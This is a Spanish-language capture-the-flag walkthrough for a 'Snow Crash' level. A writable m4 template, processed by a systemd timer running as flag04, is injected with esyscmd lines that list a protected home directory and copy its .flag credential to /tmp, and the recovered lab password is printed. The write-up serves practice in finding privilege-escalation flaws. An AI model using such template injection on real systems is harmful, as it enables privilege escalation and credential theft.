# Level04 - Snow Crash

## Tipo de ejercicio

Análisis de un proceso automático y de los archivos que utiliza.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level05`.

Para conseguirla, hay que descubrir qué proceso automático puede ejecutar
acciones con los permisos de `flag04`.

## 1. Inspeccionar el nivel

Desde la sesión SSH de `level04`:

```bash
whoami
pwd
ls -la
cat README
```

Estos comandos confirman la identidad y la ubicación de la sesión. `whoami`
muestra el usuario actual, `pwd` el directorio de trabajo, `ls -la` todos los
archivos incluidos los ocultos y `cat README` lee la pista del nivel.

El README contiene la pista:

```text
In the beginning was the Word.
```

El resultado de `ls -la` no muestra más pistas en el directorio personal. Como
el ejercicio puede utilizar archivos fuera de ese directorio, examinamos los
archivos propios del nivel:

```bash
find /opt/snowcrash/level04 -maxdepth 2 -type f -print

```
Resultado relevante:

```text
/opt/snowcrash/level04/babel.sh
```

El resultado muestra el archivo `babel.sh` dentro del directorio del nivel.
Ahora comprobamos sus permisos, su tipo y su contenido:

```bash
ls -la /opt/snowcrash/level04
ls -l /opt/snowcrash/level04/babel.sh
file /opt/snowcrash/level04/babel.sh
sed -n '1,240p' /opt/snowcrash/level04/babel.sh
```

`ls -la` muestra los archivos del directorio.
`ls -l` muestra los permisos y el propietario de `babel.sh`.
`file` identifica su tipo sin ejecutarlo, y
`sed -n '1,240p'` muestra sus primeras 240 líneas para analizar qué hace.

La salida de `sed` confirma que el script procesa la plantilla:

```text
/var/lib/babel/templates/template.m4
```

y genera:

```text
/var/lib/babel/output.conf
```

## 2. Descubrir y analizar el servicio Babel

Primero se buscan referencias a `babel` en `systemd`:

```bash
grep -R -n 'babel' /etc/systemd/system 2>/dev/null
```

Resultado:

```text
/etc/systemd/system/timers.target.wants/babel.timer:3:Requires=babel.service
/etc/systemd/system/babel.service:8:ExecStart=/opt/snowcrash/level04/babel.sh
/etc/systemd/system/babel.timer:3:Requires=babel.service
```

En la primera línea aparece `timers.target.wants`, la carpeta que systemd usa
para registrar los temporizadores habilitados. Por eso esa línea solo confirma
que `babel.timer` está activado; la configuración que necesitamos está en
`/etc/systemd/system/babel.timer`, que se lee más abajo.
Las otras dos líneas señalan directamente las definiciones del servicio y del temporizador.

Ahora se hacen dos comprobaciones independientes:

```bash
systemctl list-units --type=service --all | grep -i babel
systemctl list-timers --all --no-pager | grep -i babel
```

`list-units` confirma que el servicio está cargado y `list-timers` muestra el
temporizador y su programación.

Por último, se leen las dos definiciones principales:

```bash
cat /etc/systemd/system/babel.service
cat /etc/systemd/system/babel.timer
```

La parte relevante del servicio es:

```ini
[Service]
Type=oneshot
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
```

El temporizador ejecuta Babel cada 30 segundos:

```ini
OnUnitActiveSec=30s
```

`OnUnitActiveSec=30s` indica que el servicio se vuelve a ejecutar 30 segundos
después de cada activación. Por eso no se ejecuta `babel.sh` directamente: se
deja que el temporizador procese la plantilla como `flag04`.

Por tanto, cualquier contenido malicioso añadido a la plantilla será
procesado automáticamente con los permisos de `flag04`.

## 3. Confirmar los permisos de la plantilla

La salida de `sed` ya ha mostrado la ruta de la plantilla:
`/var/lib/babel/templates/template.m4`. Ahora comprobamos quién puede acceder a ella y modificarla.

```bash
id
ls -ld /var/lib/babel/templates
ls -l /var/lib/babel/templates
test -w /var/lib/babel/templates/template.m4 \
	&& echo "template escribible" \
	|| echo "template no escribible"
```

`id` muestra la identidad de `level04` y los grupos a los que pertenece. La
pertenencia al grupo `babel` será importante si la plantilla también pertenece
a ese grupo y tiene permisos de escritura para él.

`ls -ld /var/lib/babel/templates` muestra los permisos, el propietario y el
grupo del directorio, sin listar su contenido.

`ls -l /var/lib/babel/templates` lista los archivos que hay dentro y permite
comprobar que existe `template.m4`, además de mostrar sus permisos, propietario
y grupo.

`test -w` comprueba si el archivo se puede escribir. `&&` muestra el primer
mensaje si la prueba tiene éxito y `||` muestra el segundo si falla.

Resultado relevante:

```text
uid=1005(level04) gid=1007(level04) groups=1007(level04),987(babel),1001(levelgroup)
drwxrwxr-x 2 root babel ... /var/lib/babel/templates
-rw-rw-r-- 1 root babel ... /var/lib/babel/templates/template.m4
template escribible
```

El usuario `level04` pertenece al grupo `babel`, la plantilla pertenece al
mismo grupo y tiene permiso de escritura para él. La salida de `test -w`
confirma que `level04` puede modificar `template.m4`.

Ahora se puede consultar el contenido actual de la plantilla:

```bash
cat /var/lib/babel/templates/template.m4
```

`m4` es un programa externo instalado en la OVA. El script `babel.sh` lo
ejecuta para leer `template.m4` y generar `output.conf`.

Se puede comprobar que está instalado con:

```bash
command -v m4
m4 --version
```

Ahora usaremos la macro `esyscmd` de `m4` para añadir a `template.m4` los
comandos que necesitamos.

`esyscmd` no es otro programa: cuando `m4` la
encuentra en la plantilla, ejecuta el comando que contiene. Para realizar el
ejercicio añadiremos líneas como esta:

```m4
esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
```

Esta línea ejecuta `/bin/ls -la /home/flag04` mediante un shell. La salida se
redirige al archivo indicado en `/tmp`; por tanto, al modificar la plantilla,
`level04` puede hacer que el servicio ejecute comandos con los permisos de
`flag04`.


## 4. Reconocer el directorio de flag04

La plantilla original no contiene todavía el comando de reconocimiento. Lo
añadimos al final con `cat >>`; el bloque `<<'EOF'` escribe literalmente la
línea hasta encontrar el segundo `EOF`:

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
EOF
```

Comprobamos que la línea se ha añadido ejecutando de nuevo:

```bash
cat /var/lib/babel/templates/template.m4
```

La línea queda guardada en la plantilla y se ejecutará cuando el temporizador
procese el archivo como `flag04`. Hay que esperar a la siguiente ejecución del
temporizador antes de consultar el resultado:

```bash
systemctl status babel.service --no-pager
ls -l /tmp/babel_flag04_listing.txt
cat /tmp/babel_flag04_listing.txt
```

`systemctl status` muestra el estado del servicio y si se produjo algún error.
`ls -l` comprueba que el archivo se ha creado y muestra sus permisos,
propietario y tamaño.
`cat` lee el listado que el comando `/bin/ls -la /home/flag04`, incluido en la
plantilla, ha guardado en ese archivo.

El listado reveló el archivo protegido:

```text
-r-------- 1 flag04 flag04 26 ... .flag
```

La ruta del secreto es:

```text
/home/flag04/.flag
```


## 5. Extraer la credencial

Ahora que conocemos la ruta de `.flag`, añadimos una segunda línea a la
plantilla para leerla como `flag04` y guardar el resultado:

```m4
esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
```

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
EOF
```

Comprobamos que la línea se ha añadido consultando las últimas líneas de la
plantilla:

```bash
tail -n 15 /var/lib/babel/templates/template.m4
```

En el siguiente ciclo del temporizador, `babel` procesa la línea y ejecuta
`cat` con los permisos de `flag04`. Después comprobamos y leemos el archivo
generado:

```bash
ls -l /tmp/level04_flag.txt
cat /tmp/level04_flag.txt
```

La primera línea de reconocimiento permanece en la plantilla; la segunda línea
se ejecuta después y escribe la flag en `/tmp/level04_flag.txt`.

La credencial obtenida fue:

```text
ne2searoevaevoem4ov4ar8ap
```

## 6. Limpiar la plantilla

Antes de salir del nivel, conviene eliminar las dos líneas `esyscmd` añadidas
a `template.m4`, para dejar la plantilla como estaba y que el siguiente
intento del ejercicio parta de un estado limpio:

```bash
sed -i '/esyscmd(`\/bin\/ls -la \/home\/flag04/d; /esyscmd(`\/bin\/cat \/home\/flag04\/\.flag/d' /var/lib/babel/templates/template.m4
```

Comprobamos que las líneas ya no están presentes:

```bash
tail -n 15 /var/lib/babel/templates/template.m4
```

## 7. Conectarse a level05

Desde el equipo anfitrión, cerrar la sesión de `level04` y conectarse al
siguiente nivel:

```bash
exit
ssh level05@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
ne2searoevaevoem4ov4ar8ap
```

La conexión correcta muestra un prompt similar a:

```text
level05@snowcrash:~$
```

## Conclusión

La solución consiste en aprovechar que `level04` pertenece
al grupo `babel` y puede modificar la plantilla `template.m4`.

El servicio `babel`, ejecutado como `flag04`, procesa esa plantilla cada 30
segundos. La macro `esyscmd` permite ejecutar comandos durante el
procesamiento, leer `/home/flag04/.flag` y guardar el contenido en un archivo
legible. La credencial obtenida para `level05` es:

```text
ne2searoevaevoem4ov4ar8ap
```
